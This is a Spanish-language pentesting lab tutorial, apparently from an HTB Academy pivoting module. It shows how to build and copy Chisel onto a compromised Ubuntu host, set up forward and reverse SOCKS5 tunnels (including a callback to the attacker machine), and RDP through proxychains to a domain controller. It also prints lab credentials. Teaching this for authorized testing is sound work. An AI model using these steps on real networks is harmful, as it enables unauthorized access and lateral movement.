
# SOCKS5 Tunneling con Chisel

[Chisel](https://github.com/jpillora/chisel) es una herramienta de tunelización basada en TCP/UDP escrita en [Go](https://go.dev/) que utiliza HTTP para transportar datos protegidos mediante SSH. `Chisel` puede crear una conexión de túnel cliente-servidor en un entorno restringido por firewall. Consideremos un escenario en el que tenemos que canalizar nuestro tráfico a un servidor web en la red `172.16.5.0`/ `23`(red interna). Tenemos el Controlador de Dominio con la dirección `172.16.5.19`. Nuestro host de ataque no puede acceder directamente a esto, ya que nuestro host de ataque y el controlador de dominio pertenecen a segmentos de red diferentes. Sin embargo, dado que hemos comprometido el servidor Ubuntu, podemos iniciar un servidor Chisel en él que escuchará en un puerto específico y reenviará nuestro tráfico a la red interna a través del túnel establecido.

### Configuración y uso de Chisel

Antes de que podamos usar Chisel, debemos tenerlo en nuestro host de ataque. Si no tenemos Chisel en nuestro host de ataque, podemos clonar el repositorio del proyecto usando el comando directamente debajo:

```shell-session
afsh4ck@kali$ git clone https://github.com/jpillora/chisel.git
```

Necesitaremos el lenguaje de programación `Go`instalado en nuestro sistema para construir el binario Chisel. Con Go instalado en el sistema, podemos movernos a ese directorio y usarlo `go build`para construir el binario Chisel.

**Construyendo el binario Chisel**

```shell-session
afsh4ck@kali$ cd chisel
go build
```

Puede resultar útil tener en cuenta el tamaño de los archivos que transferimos a los objetivos de las redes de nuestros clientes, no sólo por motivos de rendimiento sino también para considerar la detección. Dos recursos beneficiosos para complementar este concepto en particular son la publicación del blog de Oxdf " [Tunneling with Chisel and SSF](https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html) " y el tutorial de la caja de IppSec `Reddish`. IppSec comienza su explicación de Chisel, construyendo el binario y reduciendo el tamaño del binario en la marca 24:29 de su [video](https://www.youtube.com/watch?v=Yp4oxoQIBAM\&t=1469s) .

Una vez creado el binario, podemos usar `SCP` para transferirlo al host dinámico de destino.

**Transferencia de binarios de Chisel a Pivot Host**

```shell-session
afsh4ck@kali$ scp chisel ubuntu@10.129.202.64:~/
 
ubuntu@10.129.202.64's password: 
chisel                                        100%   11MB   1.2MB/s   00:09    
```

Luego podemos iniciar el listener de Chisel en el host.

**Ejecutando el servidor Chisel en el host Pivot**

```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

El oyente Chisel escuchará las conexiones entrantes en el puerto `1234` usando SOCKS5 ( `--socks5`) y las reenviará a todas las redes a las que se puede acceder desde el host pivote. En nuestro caso, el host pivot tiene una interfaz en la red 172.16.5.0/23, lo que nos permitirá llegar a hosts en esa red.

Podemos iniciar un cliente en nuestro host de ataque y conectarnos al servidor Chisel.

**Conexión al servidor Chisel**

```shell-session
afsh4ck@kali$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

Como puede ver en el resultado anterior, el cliente Chisel ha creado un túnel TCP/UDP a través de HTTP protegido mediante SSH entre el servidor Chisel y el cliente y ha comenzado a escuchar en el puerto 1080. Ahora podemos modificar nuestro archivo proxychains.conf ubicado en `/etc/proxychains.conf`y agregue `1080`el puerto al final para que podamos usar cadenas proxy para pivotar usando el túnel creado entre el puerto 1080 y el túnel SSH.

**Edición y confirmación de proxychains.conf**

Podemos usar cualquier editor de texto que queramos para editar el archivo `proxychains.conf` y luego confirmar nuestros cambios de configuración usando `tail`.

```shell-session
afsh4ck@kali$ tail -f /etc/proxychains.conf 

#
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4 	127.0.0.1 9050
socks5 127.0.0.1 1080
```

Ahora, si usamos cadenas de proxy con RDP, podemos conectarnos al DC en la red interna a través del túnel que hemos creado para el host Pivot.

**Pivoting hacia el DC**

```shell-session
afsh4ck@kali$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

***

### Pivoting inverso de Chisel

En el ejemplo anterior, utilizamos la máquina comprometida (Ubuntu) como nuestro servidor Chisel, listada en el puerto 1234. Aun así, puede haber escenarios en los que las reglas del firewall restrinjan las conexiones entrantes a nuestro objetivo comprometido. En tales casos, podemos utilizar Chisel con la opción inversa.

Cuando el servidor Chisel está `--reverse` habilitado, los controles remotos pueden tener el prefijo con `R`para indicar invertido. El servidor escuchará y aceptará conexiones, y serán enviadas mediante proxy a través del cliente, que especificó el control remoto. Los controles remotos inversos que se especifiquen `R:socks`escucharán en el puerto de calcetines predeterminado del servidor (1080) y finalizarán la conexión en el proxy SOCKS5 interno del cliente.

Iniciaremos el servidor en nuestro host de ataque con la opción `--reverse`.

**Iniciando el servidor Chisel en nuestro host de ataque**

```shell-session
afsh4ck@kali$ sudo ./chisel server --reverse -v -p 1234 --socks5

2022/05/30 10:19:16 server: Reverse tunnelling enabled
2022/05/30 10:19:16 server: Fingerprint n6UFN6zV4F+MLB8WV3x25557w/gHqMRggEnn15q9xIk=
2022/05/30 10:19:16 server: Listening on http://0.0.0.0:1234
```

Luego nos conectamos desde Ubuntu (host pivote) a nuestro host de ataque, usando la opción `R:socks`

**Conectando el cliente Chisel a nuestro host de ataque**

```shell-session
ubuntu@WEB01$ ./chisel client -v 10.10.14.17:1234 R:socks

2022/05/30 14:19:29 client: Connecting to ws://10.10.14.17:1234
2022/05/30 14:19:29 client: Handshaking...
2022/05/30 14:19:30 client: Sending config
2022/05/30 14:19:30 client: Connected (Latency 117.204196ms)
2022/05/30 14:19:30 client: tun: SSH connected
```

Podemos usar cualquier editor que queramos para editar el archivo proxychains.conf y luego confirmar nuestros cambios de configuración usando `tail`.

**Edición y confirmación de proxychains.conf**

```shell-session
afsh4ck@kali$ tail -f /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

Si usamos proxychains con RDP, podemos conectarnos al DC en la red interna a través del túnel que hemos creado para el host Pivot.

```shell-session
afsh4ck@kali$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

## <mark style="color:purple;">Caso práctico</mark>

Usando los conceptos enseñados en esta sección, conéctese al objetivo y establezca un túnel SOCKS5 que pueda usarse para RDP en el controlador de dominio (`172.16.5.19`, `victor:pass@123`). Envía el contenido de C:\Users\victor\Documents\flag.txt como respuesta.

```
SSH a 10.129.188.30 (ACADEMY-PIVOTING-LINUXPIV)
usuario "ubuntu"
contraseña "HTB_@cademy_stdnt!"
```

### Creación y envío del binario de Chisel

```shell-session
afsh4ck@kali$ scp chisel ubuntu@10.129.188.30:~/
 
ubuntu@10.129.202.64's password: 
chisel                                        100%   11MB   1.2MB/s   00:09    
```

<figure><img src="/files/8IieUEX8yLWpE1Ee89wK" alt=""><figcaption></figcaption></figure>

```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5
2024/06/17 18:22:27 server: Fingerprint +arF4d3FmWg/NHjgWXYqKWMgjIdarCZWt2ifLDnQ980=
2024/06/17 18:22:27 server: Listening on http://0.0.0.0:1234
```

### Ejecutar Chisel

* En el servidor:

```shell-session
ubuntu@WEB01:~$ ./chisel server -v -p 1234 --socks5

2022/05/05 18:16:25 server: Fingerprint Viry7WRyvJIOPveDzSI2piuIvtu9QehWw9TzA3zspac=
2022/05/05 18:16:25 server: Listening on http://0.0.0.0:1234
```

* En Kali:

```shell-session
afsh4ck@kali$ ./chisel client -v 10.129.202.64:1234 socks

2022/05/05 14:21:18 client: Connecting to ws://10.129.202.64:1234
2022/05/05 14:21:18 client: tun: proxy#127.0.0.1:1080=>socks: Listening
2022/05/05 14:21:18 client: tun: Bound proxies
2022/05/05 14:21:19 client: Handshaking...
2022/05/05 14:21:19 client: Sending config
2022/05/05 14:21:19 client: Connected (Latency 120.170822ms)
2022/05/05 14:21:19 client: tun: SSH connected
```

### Proxychains y RDP

```shell-session
afsh4ck@kali$ sudo nano /etc/proxychains.conf 

[ProxyList]
# add proxy here ...
# socks4    127.0.0.1 9050
socks5 127.0.0.1 1080 
```

```shell-session
afsh4ck@kali$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
```

<figure><img src="/files/gi8oj1hRHKt5NpUJs7eB" alt=""><figcaption></figcaption></figure>
